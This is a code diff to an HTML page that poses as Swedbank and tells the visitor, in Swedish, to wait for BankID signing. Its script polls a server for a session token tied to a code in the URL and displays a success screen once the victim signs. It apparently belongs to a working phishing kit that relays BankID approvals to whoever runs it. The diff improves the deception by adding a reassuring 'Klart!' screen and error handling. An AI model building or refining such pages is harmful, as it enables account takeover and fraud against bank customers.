@@ -16,26 +16,52 @@ p{color:#555;font-size:15px;line-height:1.55}
 .spin{width:34px;height:34px;margin:26px auto;border:3px solid #ddd;border-top-color:#ff6a00;border-radius:50%;animation:s 1s linear infinite}
 @keyframes s{to{transform:rotate(360deg)}}
 .foot{font-size:13px;color:#777;margin-top:34px;line-height:1.5}
+.ok{font-size:44px;margin:10px 0;color:#22aa55;font-weight:700}
 </style>
 </head>
 <body>
 <div class="top">Swedbank</div>
 <div class="wrap">
-  <h1>Valkommen!</h1>
-  <p>Vanligen invanta BankID-signeringen for att fortsatta.</p>
-  <div class="spin"></div>
+  <div class="ok" id="ok"></div>
+  <h1 id="h">Valkommen!</h1>
+  <p id="t">Vanligen invanta BankID-signeringen for att fortsatta.</p>
+  <div class="spin" id="sp"></div>
   <a id="b" href="#">Vantar...</a>
   <p class="foot">Du ar nu i kontakt med Swedbank.<br>Folj instruktionerna.</p>
 </div>
 <script>
 var code = location.pathname.split('/').pop();
 var b = document.getElementById('b');
+var h = document.getElementById('h');
+var t = document.getElementById('t');
+var sp = document.getElementById('sp');
+var ok = document.getElementById('ok');
 var lastTok = '';
 var timer = null;
+var fel = 0;
+
+function klart() {
+  clearInterval(timer);
+  sp.style.display = 'none';
+  b.style.display = 'none';
+  ok.textContent = 'OK';
+  h.textContent = 'Klart!';
+  t.textContent = 'Din signering ar klar. Du kan stanga sidan.';
+}
 
 function poll() {
   fetch('/api/session/' + code + '/state').then(function(r){return r.json()}).then(function(s){
-    if (!s.ok) return;
+    if (!s.ok) {
+      fel++;
+      if (fel > 3) {
+        sp.style.display = 'none';
+        h.textContent = 'Sessionen hittades inte';
+        t.textContent = 'Be om en ny lank.';
+      }
+      return;
+    }
+    fel = 0;
+    if (s.signed) { klart(); return; }
     if (s.token && s.token !== lastTok) {
       lastTok = s.token;
       b.className = 'live';
